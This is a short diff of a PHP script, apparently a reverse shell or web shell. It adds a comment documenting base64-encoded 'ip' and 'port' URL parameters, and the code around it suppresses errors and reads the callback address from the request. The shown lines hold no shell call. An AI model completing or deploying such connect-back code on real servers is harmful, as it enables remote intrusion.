@@ -3,7 +3,7 @@
 @error_reporting(0);
 @ini_set('display_errors', 0);
 
-
+// ip=base64&port=base64
 $ip_b64 = isset($_GET['ip']) ? $_GET['ip'] : 'MTkyLjE2OC4xLjU=';  // default value if not provided
 $port   = isset($_GET['port']) ? (int)$_GET['port'] : 222;         // default port if not provided
 
